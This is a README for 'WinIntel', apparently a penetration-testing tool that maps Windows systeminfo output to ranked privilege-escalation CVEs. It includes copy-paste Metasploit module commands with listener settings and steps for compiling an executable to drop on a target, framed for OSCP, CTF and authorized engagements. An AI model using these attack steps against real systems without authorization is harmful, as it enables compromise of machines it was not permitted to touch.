<h1 align="center">
<img src="https://img.shields.io/badge/WinIntel-v1.0.0-00d4a8?style=for-the-badge&logo=windows&logoColor=white">
<img src="https://img.shields.io/badge/CVEs-118-red?style=for-the-badge">
<img src="https://img.shields.io/badge/ITW-40-critical?style=for-the-badge">
<img src="https://img.shields.io/badge/license-MIT-green?style=for-the-badge">
</h1>

```
 ██╗    ██╗██╗███╗   ██╗██╗███╗   ██╗████████╗███████╗██╗
 ██║    ██║██║████╗  ██║██║████╗  ██║╚══██╔══╝██╔════╝██║
 ██║ █╗ ██║██║██╔██╗ ██║██║██╔██╗ ██║   ██║   █████╗  ██║
 ██║███╗██║██║██║╚██╗██║██║██║╚██╗██║   ██║   ██╔══╝  ██║
 ╚███╔███╔╝██║██║ ╚████║██║██║ ╚████║   ██║   ███████╗███████╗
  ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚══════╝

Windows Exploit Intelligence  ·  systeminfo.txt → ranked LPE attack plan
118 CVEs  ·  2003–2026  ·  XP → Win11 24H2  ·  Watson + WES-NG accuracy
```

> Paste `systeminfo` output → get a **ranked, copy-paste ready attack plan** with Metasploit modules, SecWiki compiled binaries, ExploitDB links, ITW markers, and reliability ratings. Built for OSCP / CTF / real engagements.

---

## Why not just Watson or WES-NG?

| | Watson | WES-NG | **WinIntel** |
|---|---|---|---|
| Accuracy | Build-range | KB-level | **KB + build-range** |
| Exploit intel | Links | Links | **MSF · SecWiki · EDB · PoC** |
| Ranked attack plan | ✗ | ✗ | **✓ P1 → P3** |
| ITW markers | ✗ | ✗ | **✓ (APT · ransomware · DPRK)** |
| Reliability ratings | ✗ | ✗ | **✓ ★★★★★** |
| Win11 detection | ✗ | Partial | **✓ build-aware** |
| Real-time updates | ✗ | definitions.zip | **✓ `--update`** |
| LPE-only filter | ✗ | ✗ | **✓ `--lpe-only`** |
| KB deduplication | ✗ | ✗ | **✓** |
| EOL build awareness | ✗ | ✗ | **✓** |
| Standalone | .NET | Python + zip | **Single .py file** |

---

## Quick start

```bash
pip install rich
python winintel.py -i systeminfo.txt
```

---

## OSCP / CTF Workflow

```bash
# On target (Windows cmd)
systeminfo > C:\Users\Public\s.txt

# Transfer to Kali, then:
python winintel.py -i s.txt --quick            # top 8, zero noise
python winintel.py -i s.txt --lpe-only         # all LPE/RCE, no clutter
python winintel.py -i s.txt --lpe-only --msf-only --msf-script attack.rc
msfconsole -q -r attack.rc

# Add services confirmed by nmap
python winintel.py -i s.txt --quick --services smb,rdp,print

# Have SeImpersonatePrivilege? (service/IIS shell)
python winintel.py -i s.txt --lpe-only --privilege service
```

---

## Example output (`--quick` on BASTARD HTB)

```
WinIntel v1.0.0  --quick mode
  Microsoft Windows Server 2008 R2  Build 7600  Arch X64  HFs 0
  CONFIRMED:18  LIKELY:5  (lpe-only · kb-deduped · exploitable · no noise)

── QUICK ATTACK PLAN ──────────────────────────────────────────────

  #1 CONF P1 CVE-2012-0178  Great  Kernel Driver
     SYSRET kernel handler flaw — local SYSTEM (x64 only)
     use exploit/windows/local/ms12_042_sysret
     set SESSION 1; set LHOST tun0; set LPORT 4444; run

  #2 CONF P1 CVE-2016-0099  Excellent  Service LPE  (ITW)
     Secondary Logon service handle LPE — local SYSTEM
     use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
     set SESSION 1; set LHOST tun0; set LPORT 4444; run

  #3 CONF P2 CVE-2017-0213  Great  Service LPE
     COM aggregate marshaler LPE — SecWiki binary (no recompile)
     SecWiki: CVE-2017-0213
```

---

## All flags

| Flag | Description |
|------|-------------|
| `-i / --input FILE` | `systeminfo.txt` path (or pipe via stdin) |
| `--quick` | Top 8 exploitable entries, copy-paste ready, zero noise |
| `--lpe-only` | Filter to LPE / RCE types only (remove Info/DoS/AuthBypass) |
| `--exploitable-only` | Require MSF module, SecWiki binary, or EDB entry |
| `--msf-only` | Only CVEs with Metasploit modules |
| `--privilege` | `user` (default) · `service` (SeImpersonate) · `admin` (UAC bypass) |
| `--services LIST` | `smb,rdp,iis,print,kerberos,rpc,bits` |
| `--category CAT` | `kernel_driver` · `service_lpe` · `print_spooler` · `rce_smb` · ... |
| `--severity SEV` | `CRITICAL` · `HIGH` · `MEDIUM` · `LOW` |
| `--show-manual` | Show MANUAL tier (can't verify from systeminfo) |
| `--csv / --json` | Export results |
| `--msf-script FILE` | Export Metasploit resource script (`.rc`) |
| `--plain` | Plain text (no colors, for logging) |
| `--update` | Download latest `definitions.json` from GitHub |
| `--check-update` | Check if newer definitions available |
| `--generate-definitions FILE` | Export DB as `definitions.json` for hosting |
| `--db-count` | Show database statistics |
| `--version` | Show version |

---

## Compile to .exe (for drop-on-target)

```bash
# Install PyInstaller (Windows or Wine)
pip install pyinstaller rich
python build.py
# → dist/winintel.exe

# On target:
winintel.exe -i systeminfo.txt --quick
systeminfo | winintel.exe --lpe-only
```

---

## Real-time update

```bash
python winintel.py --update          # pull latest definitions from GitHub
python winintel.py --check-update    # check without downloading
```

When new CVEs drop, pull definitions without reinstalling the script:
```bash
# (maintainer workflow)
# Edit CVE_DB in winintel.py, then:
python winintel.py --generate-definitions definitions.json
git add definitions.json && git commit -m "Add CVE-XXXX" && git push
# Users get it via: python winintel.py --update
```

---

## CVE coverage (v1.0.0)

**118 CVEs · 2003–2026 · XP → Win11 24H2**

| Category | Count | Notable |
|----------|-------|---------|
| Kernel Driver | 62 | Win32k, CLFS, AFD.sys, Hyper-V VSP, appid.sys |
| Service LPE | 15 | Secondary Logon, Task Scheduler, WER |
| SMB RCE | 7 | EternalBlue, EternalRomance, SMBGhost |
| IIS / Web RCE | 6 | WebDAV, ASP.NET |
| Network RCE | 5 | MS03-026, Schannel, Bad Neighbor |
| Print Spooler | 5 | PrintNightmare, CVE-2022-38028 (APT28) |
| NTLM Relay | 3 | Hot Potato, RottenPotato, Outlook |
| Kerberos | 3 | MS14-068, ZeroLogon |
| Kernel Race | 3 | Pool overflow, double-free |
| Cred Access | 3 | HiveNightmare, NTFS info-disclosure |
| Others | 5 | Installer LPE, RDP RCE |

**40 ITW CVEs** — EternalBlue/NSA · Lazarus/DPRK · APT28 · Storm-2460 · Nokoyawa · Black Basta · MysterySnail · PipeMagic

---

## Accuracy model

```
CONFIRMED  → KB identified + NOT in hotfixes    → proven vulnerable
LIKELY     → build in known vulnerable range    → probably vulnerable
MANUAL     → cannot verify from systeminfo      → use --show-manual
```

Smart filters applied automatically:
- **Architecture** — x86-only CVEs hidden on x64 targets (KiTrap0D, AFD.sys variants)
- **Build cap** — pre-2017 CVEs filtered on Server 2022+ (KB was never issued for that OS)
- **EOL awareness** — post-2022 CVEs on EOL builds (Win10 < 1809) downgraded to LIKELY
- **Domain detection** — Kerberos exploits only shown when actually domain-joined
- **Service gating** — SMB/RDP/print CVEs gated behind `--services` flag

---

## Requirements

- Python 3.7+
- `rich` (optional): `pip install rich`
- No internet at runtime (unless using `--update`)

---

## Legal

For **authorized** penetration testing and security research only.

---

**Author:** [drgoteee](https://github.com/drgoteee) · CPTS · OSCP+  
**Inspired by:** Watson (rasta-mouse) · WES-NG (bitsadmin) · SecWiki/windows-kernel-exploits
